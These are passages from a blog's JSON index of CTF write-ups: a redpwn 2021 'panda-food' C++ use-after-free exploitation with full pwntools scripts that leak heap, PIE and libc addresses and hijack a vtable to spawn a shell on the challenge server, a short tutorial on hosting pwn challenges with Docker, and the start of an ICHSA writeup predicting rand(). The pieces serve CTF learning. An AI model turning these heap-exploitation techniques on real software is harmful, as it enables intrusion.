std::string\u0026\u0026 name) : Food(std::move(name)) {} virtual void Eat() { std::cout \u003c\u003c \"crunch crunch\" \u003c\u003c std::endl; } }; inline size_t get_idx() { size_t idx; std::cout \u003c\u003c \"idx: \" \u003c\u003c std::endl; std::cin \u003e\u003e idx; return idx; } uint64_t rand64() { uint64_t var = 0; static int ufd = open(\"/dev/urandom\", O_RDONLY); if (read(ufd, \u0026var, sizeof(var)) != sizeof(var)) { perror(\"ufd read\"); exit(1); } return var; } int main() { std::map\u003csize_t, std::unique_ptr\u003cFood\u003e\u003e foods; Food* favorite = nullptr; int choice; while (true) { std::cout \u003c\u003c \"choice: \" \u003c\u003c std::endl; std::cin \u003e\u003e choice; switch (choice) { case 0: { size_t idx = get_idx(); std::unique_ptr\u003cFood\u003e tmp; std::string name; std::cout \u003c\u003c \"name: \" \u003c\u003c std::endl; std::cin \u003e\u003e name; if (name.length() \u003e 0x1000) { std::cout \u003c\u003c \"too big :/\" \u003c\u003c std::endl; _Exit(1); } else { if (rand64() % 2 == 1) tmp = std::make_unique\u003cBamboo\u003e(std::move(name)); else tmp = std::make_unique\u003cFood\u003e(std::move(name)); foods[idx] = std::move(tmp); } break; } case 1: { size_t idx = get_idx(); favorite = foods[idx].get(); break; } case 2: { if (favorite) favorite-\u003ePrintName(); else std::cout \u003c\u003c \"set a favorite first!\" \u003c\u003c std::endl; break; } case 3: { char one_gadget_padding[0x100]; memset(one_gadget_padding, 0, sizeof(one_gadget_padding)); if (favorite) favorite-\u003eEat(); else std::cout \u003c\u003c \"set a favorite first!\" \u003c\u003c std::endl; break; } case 4: { _Exit(0); break; } } } } Associated I/O glue: from pwnscripts import * from string import whitespace context.binary = 'chall' if args.LOCAL: context.libc = 'libc6_2.27-3ubuntu1.4_amd64' r = context.binary.process() else: r = remote('mc.ax', 31707) optc = 0 def flush(): # speed up i/o by deferring recvs until necessary global optc while optc: r.recvuntil('choice: \\n') optc -= 1 def choose(opt: int): global optc r.sendline(str(opt)) # io speed: r.sendlineafter('choice: \\n', str(opt)) optc+=1 def sendidx(idx: int): r.sendline(str(idx)) # io speed: r.sendlineafter('idx: \\n', str(idx)) def alloc(idx: int, name: bytes): assert all(c not in whitespace.encode() for c in name) # whitespace will cause cin to terminate. This necessarily means that some ASLR bytes can kill an exploit. assert len(name) \u003c 0x1000 choose(0) sendidx(idx) r.sendline(name) # io speed: r.sendlineafter('name: \\n', name) def fav(idx: int): choose(1) sendidx(idx) def printName() -\u003e bytes: choose(2) flush() r.recvuntil('name: ') return r.recvline(timeout=1)[:-1] def Eat(): choose(3) ","date":"July 11, 2021","objectID":"/blog/redpwn-2021-panda-food/:1:0","tags":["writeup","pwn"],"title":"C++ Smart Pointer UAFs: redpwn 2021's panda-food","uri":"/blog/redpwn-2021-panda-food/"},{"categories":["CTF"],"content":"Exploring Looking at the code, although I‚Äôm unable to spot the obvious bug for a lack of experience, I manage to identify a few oddities: Bamboo‚Äôs constructor uses string\u0026\u0026; Food uses string. I know that \u0026 means ‚Äúpass by reference‚Äù, so only one of the two constructors will allocate and duplicate an entire string. The random nature of Food vs Bamboo probably complicates the exploit to make fuzzing a bit harder. unique_ptr\u003cBamboo\u003e gets casted away into unique_ptr\u003cFood\u003e, and unique_ptr\u003cFood\u003e can get casted into a Food* in favorite. there‚Äôs an obvious need to overwrite virtual function Eat() with a `one_gadget`` I figure I need a better understanding of the C++ types used here, so I begin to search. ","date":"July 11, 2021","objectID":"/blog/redpwn-2021-panda-food/:2:0","tags":["writeup","pwn"],"title":"C++ Smart Pointer UAFs: redpwn 2021's panda-food","uri":"/blog/redpwn-2021-panda-food/"},{"categories":["CTF"],"content":"std::google The first thing I search for is std::move. It seems to magically move around memory references somehow, invalidating the argument passed to move(...). That‚Äôs interesting from a programmatic perspective, but I don‚Äôt really understand how it‚Äôll be relevant for the pwn. I search for std::make_unique next. It returns a std::unique_ptr, so I search for that too. With a little bit of reading, I figure out that I‚Äôve actually heard of unique_ptrs before, under a different name: smart pointers. The example at the link makes them really easy to understand: A unique_ptr will be deleted (freed) when it goes ‚Äúout of scope‚Äù. In the case of the current program, there‚Äôs a unique_ptr\u003cFood\u003e tmp scoped to case 0: case 0: { size_t idx = get_idx(); std::unique_ptr\u003cFood\u003e tmp; if (name.length() \u003e 0x1000) { std::cout \u003c\u003c \"too big :/\" \u003c\u003c std::endl; _Exit(1); } else { if (rand64() % 2 == 1) tmp = std::make_unique\u003cBamboo\u003e(std::move(name)); else tmp = std::make_unique\u003cFood\u003e(std::move(name)); foods[idx] = std::move(tmp); } break; } // tmp is deleted automatically here? In this case, tmp isn‚Äôt freed after breaking from case 0, which I can demonstrate readily with ltrace: $ ltrace ./chall 2\u003e\u00261 | grep -e malloc -e free -e fwrite malloc(72704) = 0x7fffd2069010 fwrite(\"choice: \", 1, 8, 0x7fcd0e4ea600) = 8 0 fwrite(\"idx: \", 1, 5, 0x7fcd0e4ea600) = 5 0 fwrite(\"name: \", 1, 6, 0x7fcd0e4ea600) = 6 hiii malloc(40) = 0x7fffd207be40 malloc(48) = 0x7fffd207be70 Over here, I‚Äôve allocated a unique_ptr\u003cFood\u003e to foods[0]. std::move effectively ‚Äútransfers ownership‚Äù2 of the smart pointer to foods[]. If I repeat that allocation, fwrite(\"choice: \", 1, 8, 0x7fcd0e4ea600) = 8 0 fwrite(\"idx: \", 1, 5, 0x7fcd0e4ea600) = 5 0 fwrite(\"name: \", 1, 6, 0x7fcd0e4ea600) = 6 heyagain malloc(40) = 0x7fffd207beb0 free(0x7fffd207be40) = \u003cvoid\u003e fwrite(\"choice: \", 1, 8, 0x7fcd0e4ea600) = 8 A free() does happen this time, because when a new unique_ptr is assigned to foods[0], the pointer that already existed at foods[0] understands that there are no references left to it (that it has gone out of scope), causing it to delete itself. At this point, I get a flash of insight as I discover what the main bug is: favorite. case 1: { size_t idx = get_idx(); favorite = foods[idx].get(); break; } favorite is a normal ‚Äúdumb‚Äù pointer. A unique_ptr from foods[] can‚Äôt keep track of favorites, and when the unique_ptr associated with favorites is freed, a dangling pointer is left in favorites, causing a use after free. ","date":"July 11, 2021","objectID":"/blog/redpwn-2021-panda-food/:2:1","tags":["writeup","pwn"],"title":"C++ Smart Pointer UAFs: redpwn 2021's panda-food","uri":"/blog/redpwn-2021-panda-food/"},{"categories":["CTF"],"content":"Testing the UAF I start with a little bit of experimentation: alloc(0, b'a'*0x47) alloc(1, b'b'*0x47) alloc(2, b'c'*0x47) fav(2) alloc(2, b'A'*0x17) alloc(1, b'B'*0x17) alloc(0, b'C'*0x17) printName() My hope here is that, in using allocations of different sizes, the merging and reallocation3 of a freed foods[2] will lead to one of the input strings overwriting *favorites. The code above produces a crash sometimes4; here‚Äôs one possible variant of a crash, where the contents of favorite are overwritten with the string data of the 2nd re-allocation: (gdb) telescope favorite 0x00007ffff76da1c0‚îÇ+0x0000: \"BBBBBBBBBBBBBBBBBBBBBBB\" 0x00007ffff76da1c8‚îÇ+0x0008: \"BBBBBBBBBBBBBBB\" 0x00007ffff76da1d0‚îÇ+0x0010: 0x0042424242424242 (\"BBBBBBB\"?) 0x00007ffff76da1d8‚îÇ+0x0018: 0x000000000000003c (\"\u003c\"?) 0x00007ffff76da1e0‚îÇ+0x0020: 0x0000000000000000 0x00007ffff76da1e8‚îÇ+0x0028: 0x0000000000000051 (\"Q\"?) 0x00007ffff76da1f0‚îÇ+0x0030: 0x0000000000000000 0x00007ffff76da1f8‚îÇ+0x0038: \"ccccccccccccccccccccccccccccccccccccccccccccccc\" 0x00007ffff76da200‚îÇ+0x0040: \"ccccccccccccccccccccccccccccccccccccccc\" 0x00007ffff76da208‚îÇ+0x0048: \"ccccccccccccccccccccccccccccccc\" At this point, it might be helpful to describe my approximation of how Food/Bamboo is represented in memory: struct Food { void **_vtable; // _vtable[0] == Eat() basic_string name_; } struct basic_string { union { struct { char *p; // when capacity\u003e0xf, p holds a pointer to the actual bytes of the string data. size_t size; // don't really know what happens to this for capacity \u003c 0x10 } char buf[0x10]; } size_t capacity; } // sizeof(basic_string) == 0x20 The invalid favorite struct has favorite-\u003ename_.p pointing to 0x4242424242424242, which necessarily causes a segfault when dereferenced. If I change b'B'*0x17 in my exploit code to fit({8: pack(ptr)})+b'B'*7, I‚Äôll be able to leak the contents of ptr. The conditions are not favorable: Start End Offset Perm Path 0x00005576017e3000 0x00005576018ca000 0x0000000000000000 r-x chall 0x0000557601ac9000 0x0000557601ad1000 0x00000000000e6000 r-- chall 0x0000557601ad1000 0x0000557601ad2000 0x00000000000ee000 rw- chall 0x0000557601ad2000 0x0000557601ad5000 0x0000000000000000 rw- 0x0000557603514000 0x0000557603535000 0x0000000000000000 rw- [heap] 0x00007f2678706000 0x00007f2678709000 0x0000000000000000 rw- 0x00007f2678709000 0x00007f267872e000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x00007f267872e000 0x00007f26788a6000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x00007f26788a6000 0x00007f26788f0000 0x000000000019d000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x00007f26788f0000 0x00007f26788f1000 0x00000000001e7000 --- /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x00007f26788f1000 0x00007f26788f4000 0x00000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x00007f26788f4000 0x00007f26788f7000 0x00000000001ea000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x00007f26788f7000 0x00007f26788fb000 0x0000000000000000 rw- 0x00007f26788fb000 0x00007f267890a000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libm-2.31.so 0x00007f267890a000 0x00007f26789b1000 0x000000000000f000 r-x /usr/lib/x86_64-linux-gnu/libm-2.31.so 0x00007f26789b1000 0x00007f2678a48000 0x00000000000b6000 r-- /usr/lib/x86_64-linux-gnu/libm-2.31.so 0x00007f2678a48000 0x00007f2678a49000 0x000000000014c000 r-- /usr/lib/x86_64-linux-gnu/libm-2.31.so 0x00007f2678a49000 0x00007f2678a4a000 0x000000000014d000 rw- /usr/lib/x86_64-linux-gnu/libm-2.31.so 0x00007f2678a4a000 0x00007f2678a4c000 0x0000000000000000 rw- 0x00007f2678a62000 0x00007f2678a63000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so 0x00007f2678a63000 0x00007f2678a86000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so 0x00007f2678a86000 0x00007f2678a8e000 0x0000000000024000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so 0x00007f2678a8f000 0x00007f2678a90000 0x000000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so 0x00007f2678a90000 0x00007f2678a91000 0x000000000002d000 rw- /usr/lib/x86_","date":"July 11, 2021","objectID":"/blog/redpwn-2021-panda-food/:2:2","tags":["writeup","pwn"],"title":"C++ Smart Pointer UAFs: redpwn 2021's panda-food","uri":"/blog/redpwn-2021-panda-food/"},{"categories":["CTF"],"content":"Exploit hypothesis After a bit more experimentation, I successfully leak a pointer by doing this: alloc(0, b'a'*0x97) fav(0) alloc(0, b'A'*0x27) print(printName()) Resulting in: [+] Opening connection to mc.ax on port 31707: Done 0x55f53971df10000000000000000000000000000000000000000000000000000055f53971dec00000000000000000000055f53971de90000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000100000001000100 That 0x55 could be a heap pointer or a PIE pointer, so I do a lot of gdb work to figure out that this primitive leaks data from the tcache, and that the pointers leaked above are necessarily heap pointers. Right now, I have an unreliable exploit that, when successful, can produce an arbitrary read, as well as RIP control. a reliable heap pointer leak Since struct Foods are stored on the heap, the pointer to their vtables (which are stored at a PIE address) can be leaked. That PIE leak can be used to further leak a libc address from the GOT, and that leak can be used to overwrite RIP with a one_gadget. So, problem solved? Not quite. My primitive for arbitrary read / RIP control ‚Äî the fake struct Food primitive ‚Äî isn‚Äôt reliable enough to be executed 3 times in succession on a single connection. I need to try something else. ","date":"July 11, 2021","objectID":"/blog/redpwn-2021-panda-food/:3:0","tags":["writeup","pwn"],"title":"C++ Smart Pointer UAFs: redpwn 2021's panda-food","uri":"/blog/redpwn-2021-panda-food/"},{"categories":["CTF"],"content":"Better primitives Here‚Äôs my first idea: find some way to toss the pointer for favorites onto the unsorted bin. Once that‚Äôs accomplished, favorites-\u003ebk should point to somewhere near main_arena, just as how putting favorites on the tcache caused favorites-\u003ebk to point to somewhere on the heap. Leaking libc immediately would reduce the number of fake struct Foods required to 1, which was demonstrated prior to be achievable. I work on heap feng shui for a really long time, and although I managed to bring the favorites pointer onto the fastbins and the smallbins, it never gets chucked into the unsorted bin. Shifting tracks, I move on to work on a better fake struct Food primitive. I run a lot of ltrace experiments, and I eventually come up with a pseudocode understanding of how/when free() and malloc() is called in case 0: idx = getidx() is_new = not foods.count(idx) name = input() if name.size() \u003e 0xf: # if `name` needs name.p sz = 31 backing_store = malloc(sz) while sz \u003c= name.size(): free(backing_store) sz = sz*2-1 malloc(sz) tmp = malloc(40) # unique \u003cFood\u003e or \u003cBamboo\u003e if name.size() \u003e 0xf: tmp.name_.p = backing_store typ = rand64()%2 # 1 means bamboo if typ: tmp.name_.p = alloc(name.size()+1) # store copy of string if is_new: malloc(48) # allocate space for map if not is_new and foods[idx].name_.capacity \u003e 0xf: free(foods[idx].name_.p) if typ: free(backing_store) if not is_new: free(foods[idx]) foods[idx] = tmp I do even more experiments, and I hit a good solution: Make sure the tcache is empty; it‚Äôs LIFO. create a new unique_ptr at foods[idx], where foods[idx] has never been allocated before. Ensure that name.size() \u003e 0x28 to keep tcache[size=0x30] empty. favorite foods[idx]; repeat step 2. tcache[size=0x30] should only contain favorites now. create a new unique_ptr at foods[nidx], where foods[nidx] has never been allocated before, and name.size() lies within [0x10, 0x18). If foods[nidx] was a Bamboo5, favorites remains at the top of tcache[size=0x30], and step 4 should be repeated. Otherwise, favorites was overwritten with the name from step 4. favorites has a (1/2)**i chance of being overwritten correctly, where i is the number of times step 4 happens. Programmatically: def fakeFood(payload: bytes) -\u003e int: '''creates a fake Food struct containing `payload` at a random `idx`, stored as favorite. returns idx''' idx = randint(100,1\u003c\u003c30) alloc(idx, b'b'*60) fav(idx) alloc(idx, b'b'*60) for i in range(10): alloc(idx+i+1, payload[:0x17].ljust(0x17, b'\\0')) return idx This works reliably (1/1024 failure rate), so long as payload contains no whitespace (~1/15 failure rate). Right now, I have: a reliable exploit that produces an arbitrary read, as well as RIP control. a reliable heap pointer leak Can I finish the challenge? Maybe. ","date":"July 11, 2021","objectID":"/blog/redpwn-2021-panda-food/:3:1","tags":["writeup","pwn"],"title":"C++ Smart Pointer UAFs: redpwn 2021's panda-food","uri":"/blog/redpwn-2021-panda-food/"},{"categories":["CTF"],"content":"Exploitation minutiae First of all, I need to figure out the offsets to get from leak-to-leak. The heap base is easy to figure out: heapbase = (heapleak\u003e\u003e12)\u003c\u003c12 But what do you do with that? I need to find the location of an active struct Food in memory for leaking, so I search for it: def leak(addr: int, sz: int=8): # leak the first `sz` bytes from `addr` fakeFood(fit({8:addr,0x10:sz+8})) return unpack(printName()[:sz],'all') alloc(1, b'a'*7) search_str = b'\\0%s\\0' % (b'a'*7) foods1_offset = next(i for i in range(0,99999,0x1000) if search_str in (dat := pack(leak(heapbase+i,0x1000),'all'))) foods1_offset+= dat.index(search_str)-0x17 # -0x17 because that's the distance from this string to the _vtable. PIE_leak = leak(heapbase+foods1_offset) # this is a leak of `food[idx]-\u003e_vtable`. The pointer leaked is either Food‚Äôs vtable or Bamboo‚Äôs vtable, depending on what food[idx] was. I‚Äôll use that information to calculate the PIE base: def checkWhich(idx: int) -\u003e str: '''figure out if foods[idx] was a Bamboo or a Food. Destroys the current `favorite`.''' fav(idx) Eat() flush() return 'bamboo' if b'crunch' in r.recvline() else b'food' context.binary.address = pie_leak - (0x2e7d78 if checkWhich(1) == 'bamboo' else 0x2e7d50) The next part is almost robotic: leaking libc from the GOT. context.libc = context.libc_database.libc_find({f:leak(context.binary.got[f]) for f in ['malloc', 'free']}) Finally, I just need to set favorites-\u003e_vtable = \u0026one_gadget to win. I flood the heap with copies of one_gadget and leak out its position accordingly to pop a shell: og = context.libc.select_gadget(1) # (2) doesn't work; memset() in chall.cc was optimised out in the actual binary... alloc(2, pack(og)*0x1ff) # flood the heap with the one_gadget to make finding heap offset easier fakeFood(pack(heapbase+next(i for i in range(0,0x5000,0x800) if leak(heapbase+i) == og))) flush() Eat() r.interactive() That‚Äôs the end. Fun challenge. [+] Opening connection to mc.ax on port 31707: Done [*] heap: 0x559d3b513000 [*] PIE: 0x559d39fd3000 [*] found libc! id: libc6_2.27-3ubuntu1.4_amd64 [*] one_gadget: 0x7f8d39985432 [*] Switching to interactive mode idx: name: choice: $ ls flag.txt run $ cat flag.txt flag{hijacking_vtables_like_321_4243f93} ","date":"July 11, 2021","objectID":"/blog/redpwn-2021-panda-food/:3:2","tags":["writeup","pwn"],"title":"C++ Smart Pointer UAFs: redpwn 2021's panda-food","uri":"/blog/redpwn-2021-panda-food/"},{"categories":["CTF"],"content":"Footnotes Necessarily, this writeup will be riddled with misinformation and mistakes. Don‚Äôt take this as gospel, read the sources for yourself, and make a PR on this writeup if there‚Äôs a mistake you really care about. This is not the proper terminology and I won‚Äôt pretend I know what it ought to be. This doesn‚Äôt happen at all in reality. It‚Äôs almost impossible to remerge any of the allocations back into malloc_arena-\u003etop, meaning that most allocations remain confined to their own tcaches (and fastbins/smallbins if necessary), The experiment here worked as a matter of coincidence: when string.size() is in the range [0x10, 0x1f), a malloc(0x1f) call is made to handle it. This just-so-happens to land in tcache[size=0x30], which is also host to Food/Bamboo structs. The odds of crashing are proportional to the number of size=0x30 chunks present on the tcache. It‚Äôs easier to understand once you grasp how allocations are handled, but in short: the first reallocation ('A') puts foods[2] on tcache[size=0x30]. The second allocation will overwrite that chunk with B if its not a Food type, giving baseline odds of 50%. These odds go downhill if the tcache is filled with enough garbage ‚Äì something which I didn‚Äôt draw a connection to until I figured out a consistent exploit primitive. In any case, (50%)**3 isn‚Äôt good enough odds for the exploit I want. I‚Äôm still not sure about this part. The code seems to indicate vice versa, but either way it‚Äôs still a 1/2 chance per loop. ","date":"July 11, 2021","objectID":"/blog/redpwn-2021-panda-food/:4:0","tags":["writeup","pwn"],"title":"C++ Smart Pointer UAFs: redpwn 2021's panda-food","uri":"/blog/redpwn-2021-panda-food/"},{"categories":["CTF"],"content":"TLDR free a unique_ptr\u003cFood\u003e by overwriting an already existing foods[idx] saving a Food* pointer in favorite allows for a UAF; -\u003ebk can be used to leak the heap Modify the contents of favorite by heap-feng-shui-ing an 0x30 heap chunk onto the backing store for string name Use modified favorites to leak PIE from heap, and libc from PIE modify favorite‚Äôs vtable to jump to one_gadget ","date":"July 11, 2021","objectID":"/blog/redpwn-2021-panda-food/:5:0","tags":["writeup","pwn"],"title":"C++ Smart Pointer UAFs: redpwn 2021's panda-food","uri":"/blog/redpwn-2021-panda-food/"},{"categories":["CTF"],"content":"Code note: your libc-database might contain libc6_2.27-3ubuntu1.3_amd64; I removed it because the package for that libc version appears to be deleted. It‚Äôs also worth noting that this code should succeed both locally and on remote. from pwnscripts import * from string import whitespace from random import randint context.binary = 'chall' if args.LOCAL: context.libc = 'libc6_2.27-3ubuntu1.4_amd64' r = context.binary.process() else: r = remote('mc.ax', 31707) optc = 0 def flush(): # speed up i/o by deferring recvs until necessary global optc while optc: r.recvuntil('choice: \\n') optc -= 1 def choose(opt: int): global optc r.sendline(str(opt)) # io speed: r.sendlineafter('choice: \\n', str(opt)) optc+=1 def sendidx(idx: int): r.sendline(str(idx)) # io speed: r.sendlineafter('idx: \\n', str(idx)) def alloc(idx: int, name: bytes): assert all(c not in whitespace.encode() for c in name) # whitespace will cause cin to terminate. This necessarily means that some ASLR bytes can kill an exploit. assert len(name) \u003c 0x1000 choose(0) sendidx(idx) r.sendline(name) # io speed: r.sendlineafter('name: \\n', name) def fav(idx: int): choose(1) sendidx(idx) def printName() -\u003e bytes: choose(2) flush() r.recvuntil('name: ') return r.recvline(timeout=1)[:-1] def Eat(): choose(3) def checkWhich(idx: int) -\u003e str: '''figure out if foods[idx] was a Bamboo or a Food. Destroys the current `favorite`.''' fav(idx) Eat() flush() res = r.recvline() if b'crunch' in res: return 'bamboo' if b'nom nom' in res: return 'food' raise RuntimeError('wrong food') # step 1: leak heap using a UAF alloc(0, b'a'*0x97) # larger allocation to allow for larger leak alloc(1, b'a'*0x7) # needed for PIE leak later fav(0) alloc(0, b'A'*0x27) # Freeing foods[0] causes favorite-\u003ename_ to point to the tcache @ heap+0x10 (since favorite-\u003ename_ == [favorite+0x8] == (malloc_chunk*)favorite-\u003ebk) heapbase = unpack(printName()[72:80])\u00260xfffffffff000 # tcache[72:80] == tcache[size=0x30]. \u0026 to get base. log.info('heap: '+hex(heapbase)) '''on a brand new allocation, - malloc 40 (Food/Bamboo) - if foods[idx] doesn't exist, malloc 48 (map element) - if name.size() \u003e 0xf, malloc space for string (31, 61, 121, ...). - if food type is Bamboo, allocate name.size() space for a copy of the string. - if foods[idx] exists, free the backing store for foods[idx]-\u003ename_ (if foods[idx]-\u003ename_.size() was \u003e 0xf), and then free foods[idx] itself.''' def fakeFood(payload: bytes) -\u003e int: '''creates a fake Food struct containing `payload` at a random `idx`, stored as favorite. returns idx''' idx = randint(100,1\u003c\u003c30) # negligible chance of overlap alloc(idx, b'b'*60) # alloc 40, 48, 61, and potentially alloc\u0026\u0026free 61. fav(idx) alloc(idx, b'b'*60) # alloc 40\u002661, free previous 61\u002640. # the Food struct for `favorite` is at the top of tcache[size=0x30] at this point. for i in range(10): # There's a 1/2 that `favorite` is overwritten with the payload for every loop here. (1/2)**10 is a small enough error rate. # The other 1/2 chance puts `favorite` back on the top of tcache, so just repeat to increase odds. alloc(idx+i+1, payload[:0x17].ljust(0x17, b'\\0')) # Note that len(payload) must not be within [0x18, 0x28) to prevent an additional 0x30 chunk allocation. # len(payload) \u003e 0x1f is also forbidden because it would cause the malloc(31) string buffer to be freed. This resolves to len(payload) \u003c 0x17. return idx def leak(addr: int, sz: int=8): # leak the first `sz` bytes from `addr` fakeFood(fit({8:addr,0x10:sz+8})) return unpack(printName()[:sz],'all') # step 2: heap leak -\u003e PIE leak -\u003e libc leak foods1_offset = next(i for i in range(0,99999,0x1000) if b'\\0aaaaaaa\\0' in (dat := pack(leak(heapbase+i,0x1000),'all'))) # note that this is actually a constant, but I prefer finding the offset dynamically pie_leak = leak(heapbase+foods1_offset+dat.index(b'\\0aaaaaaa\\0')-23) # this is a leak of foods[1].vtable. context.binary.address = pie_leak - (0x2e7d78 if checkWhich(1) == 'bamboo' else 0x2e7d50) # offset to the .relro vtable of ","date":"July 11, 2021","objectID":"/blog/redpwn-2021-panda-food/:6:0","tags":["writeup","pwn"],"title":"C++ Smart Pointer UAFs: redpwn 2021's panda-food","uri":"/blog/redpwn-2021-panda-food/"},{"categories":["Tech"],"content":"It's really not hard.","date":"June 26, 2021","objectID":"/blog/hosting-pwn-challenges/","tags":["pwn","docker","my setups"],"title":"Hosting pwn challenges: a simple tutorial","uri":"/blog/hosting-pwn-challenges/"},{"categories":["Tech"],"content":"In light of recent events, I‚Äôve been convinced to share a basic tutorial on how You ‚Äî the ordinary programmer with minimal Linux/Docker/Networking experience ‚Äî can host binary exploitation challenges with minimal hassle and reasonable security. ","date":"June 26, 2021","objectID":"/blog/hosting-pwn-challenges/:0:0","tags":["pwn","docker","my setups"],"title":"Hosting pwn challenges: a simple tutorial","uri":"/blog/hosting-pwn-challenges/"},{"categories":["Tech"],"content":"Requirements A stable linux server with the packages docker-ce and git installed. One (or more) pwn challenge(s) you intend to host Basic linux experience That‚Äôs it. ","date":"June 26, 2021","objectID":"/blog/hosting-pwn-challenges/:1:0","tags":["pwn","docker","my setups"],"title":"Hosting pwn challenges: a simple tutorial","uri":"/blog/hosting-pwn-challenges/"},{"categories":["Tech"],"content":"Setting up a challenge folder Let‚Äôs say you have a binary named chal, as well as a flag. We‚Äôll start by git cloning a template folder: git clone https://github.com/152334H/ctf_xinetd Move the challenge binary \u0026 flag into ctf_xinetd/bin: mv chal flag ctf_xinetd/bin If you plan on hosting multiple pwn challenges, you might want to rename the cloned folder: mv ctf_xinetd my_uniq_chal_name The final result should look something like this: /path/to/my_uniq_chal_name$ tree . ‚îú bin ‚îÇ ‚îú chal ‚îÇ ‚îî flag ‚îú ctf.xinetd ‚îú Dockerfile ‚îú README.md ‚îú setup.sh ‚îî start.sh ","date":"June 26, 2021","objectID":"/blog/hosting-pwn-challenges/:2:0","tags":["pwn","docker","my setups"],"title":"Hosting pwn challenges: a simple tutorial","uri":"/blog/hosting-pwn-challenges/"},{"categories":["Tech"],"content":"Putting the challenge online Spend a few minutes to come up with a snazzy port number ($PORT) for your challenge. To get your challenge running, execute /path/to/my_uniq_chal_name$ ./setup.sh $PORT chal my_uniq_chal_name After that, you‚Äôre done! Using the example challenge linked: $ nc localhost $PORT Type something with 7fdde7ac8e10: hi You put: hi If you ever need to change the challenge file, you can update the running service by running ./rebuild.sh. ","date":"June 26, 2021","objectID":"/blog/hosting-pwn-challenges/:3:0","tags":["pwn","docker","my setups"],"title":"Hosting pwn challenges: a simple tutorial","uri":"/blog/hosting-pwn-challenges/"},{"categories":["Tech"],"content":"Benefits of using this it‚Äôs really simple and you can‚Äôt mess it up (fingers crossed) shell permissions are limited and you won‚Äôt have players messing with the shell or erasing flags halfway through a CTF you run an .sh file controlled by me without ever reading its contents ","date":"June 26, 2021","objectID":"/blog/hosting-pwn-challenges/:4:0","tags":["pwn","docker","my setups"],"title":"Hosting pwn challenges: a simple tutorial","uri":"/blog/hosting-pwn-challenges/"},{"categories":["Tech"],"content":"Downsides of using this might not scale very well hard to justify getting paid by the hour for something this simple some people just don‚Äôt like docker Sieberrsec has been, and will be using this setup for Sieberrsec CTF events, so if you find any vulnerabilities in my fork of ctf_xinetd, be sure to save them until the next CTF dutifully inform us if you find anything of note. ","date":"June 26, 2021","objectID":"/blog/hosting-pwn-challenges/:5:0","tags":["pwn","docker","my setups"],"title":"Hosting pwn challenges: a simple tutorial","uri":"/blog/hosting-pwn-challenges/"},{"categories":["CTF"],"content":"A slightly less boring problem.","date":"June 3, 2021","objectID":"/blog/icsha-2021-cop/","tags":["pwn","writeup"],"title":"ICHSA 2021: COP","uri":"/blog/icsha-2021-cop/"},{"categories":["CTF"],"content":"There weren‚Äôt many pwn challenges in ICHSA CTF, but this challenge was a little bit fun for its originality. COP [500] Hi COP I wrote a game that should be impossible to win. A friend of mine managed to get the flag in a few seconds. Can you help me find out how? Connect: nc cop.ichsa.ctf.today 8011 challenge author: Yossef Kuszer Files: COP.zip Original: $ tree COP COP ‚îú‚îÄ‚îÄ chalenge.c ‚îú‚îÄ‚îÄ chalenge.h ‚îú‚îÄ‚îÄ cop.gif ‚îú‚îÄ‚îÄ description.md ‚îú‚îÄ‚îÄ Dockerfile ‚îú‚îÄ‚îÄ DockerInstructions.md ‚îî‚îÄ‚îÄ flag.txt Updated version: $ unzip -l COP.zip Archive: COP.zip Length Date Time Name --------- ---------- ----- ---- 0 2021-06-01 22:13 COP1/ 15690 2021-05-09 20:29 COP1/chalenge.c 71732 2021-05-06 10:43 COP1/chalenge.h 3916371 2021-05-09 20:52 COP1/cop.gif 190 2021-05-10 09:01 COP1/description.md 519 2021-05-09 20:25 COP1/Dockerfile 119 2021-05-10 09:55 COP1/DockerInstructions.md 21 2021-05-30 12:28 COP1/flag.txt 1035536 2021-06-01 22:05 COP1/game --------- ------- 5040178 9 files The binary is compiled with -static, so there‚Äôs no need for libc. As for the binary itself: [*] 'game' Arch: amd64-64-little RELRO: Partial RELRO ! Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) ! Source code is provided, so I‚Äôll be skipping on the usual decompilation effort. ","date":"June 3, 2021","objectID":"/blog/icsha-2021-cop/:0:0","tags":["pwn","writeup"],"title":"ICHSA 2021: COP","uri":"/blog/icsha-2021-cop/"},{"categories":["CTF"],"content":"Bugs +===============================================+ | Wellcome to my Rock-Paper-Scissors's game | +-----------------------------------------------+ | Current score: | NOOB player: 0 Points | Computer: 0 Points +-----------------------------------------------+ | Options: | 1) Display game rules ------------- (0 Points) | 2) Play next round ---------------- (0 Points) | 3) Skip N rounds ------------------ (2 Points) | 4) Enable Ascii-art --------------- (3 Points) | 5) Change user name --------------- (5 Points) | 6) Print the flag! ------- (4294967295 Points) | 7) Exit --------------------------- (0 Points) +-----------------------------------------------+ | Please chose an option [ ] The challenge provided is a simple rock-paper-scissors simulator, limited to ARRAY_OF_PLAYS_MAX_SIZE == 170 rounds. When the game starts, the program will initialize the 170 moves the computer plans to play using rand()/srand(): // initializing pseudo-random values and populate array_of_plays srand(0); for(uint8_t i = 0; i \u003c ARRAY_OF_PLAYS_MAX_SIZE; i++) { game_ctx-\u003earray_of_plays[i].id = i; game_ctx-\u003earray_of_plays[i].handsign = (rand() % MAX_HANDSIGNS) + MIN_HANDSIGN; game_ctx-\u003earray_of_plays[i].animation_function = print_ascii; } rand() is predictable, and we can win every round of Rock-Paper-Scissors with 100% accuracy: from pwn import * context.binary = 'game' from ctypes import CDLL clib = CDLL('libc.so.6') clib.srand(0) ARRAY_OF_PLAYS_MAXSIZE = 170 array_of_plays = [clib.rand()%3 for _ in range(ARRAY_OF_PLAYS_MAXSIZE)] current_play = 0 r = remote('cop.ichsa.ctf.today', 8011) def choose(opt: int): r.recvuntil('[ ]\\b\\b') r.sendline(str(opt)) def win_round(): global current_play choose(2) r.recvuntil('[ ]\\b\\b') cpu_play = array_of_plays[current_play] current_play += 1 